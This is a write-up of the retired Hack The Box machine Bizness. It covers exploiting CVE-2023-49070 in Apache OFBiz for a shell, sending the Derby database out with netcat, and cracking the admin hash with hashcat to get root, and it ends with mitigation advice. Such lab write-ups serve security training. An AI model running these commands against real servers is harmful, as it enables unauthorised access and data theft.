---
machine: Bizness
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, ofbiz, cve-2023-49070, derby, hashcat]
---

# Bizness — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Apache OFBiz is exposed and vulnerable to CVE-2023-49070, unauthenticated remote code execution through XML-RPC. The shell allows extracting the Apache Derby database; the administrator hash is reformatted and cracked to reach root.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80,443,8443 <IP>
curl -k https://bizness.htb:8443/accounting/control/main
# CVE-2023-49070
python3 ofbiz_exploit.py https://bizness.htb:8443 <IP> 4444
# Derby database
find / -type d -name seg0 2>/dev/null
tar czf /dev/shm/derby.tgz -C /opt/ofbiz/runtime/data/derby/ofbiz seg0
nc <IP> 4444 < /dev/shm/derby.tgz
# Hash
hashcat -m 12000 hash.txt /usr/share/wordlists/rockyou.txt
```

## Enumeration

- OFBiz on port `8443` with the accounting console.
- A version predating the CVE-2023-49070 fix.
- Derby database under `runtime/data/derby/ofbiz/seg0`; the `ofbiz` user can read the application tree.

## Initial access

Identify the OFBiz version and run the XML-RPC exploit with a deserialization payload. The process returns a shell as `ofbiz` without prior credentials.

## Privilege escalation

The Derby database holds the user table with the administrator hash. Copy `seg0` with its log files, open it with `ij` or DBeaver, reformat the hash and crack it with `hashcat`. The password allows `su root`.

## Evidence

- OFBiz response disclosing the vulnerable version.
- Shell callback after the XML-RPC request.
- User table and cracked hash; root prompt.

## Lessons learned

- An exposed ERP concentrates authentication, data and execution.
- Embedded databases come with the application tree.
- Administrator hashes must be slow and salted.

## Mitigation and detection

- Update OFBiz and restrict console access.
- Do not run the application with read access to the whole database.
- Move to an external identity store and rotate credentials.

## References

- [0xdf — Bizness](https://0xdf.gitlab.io/2024/05/25/htb-bizness.html)
- [NVD — CVE-2023-49070](https://nvd.nist.gov/vuln/detail/CVE-2023-49070)
- [Hack The Box — Bizness](https://app.hackthebox.com/machines/bizness)
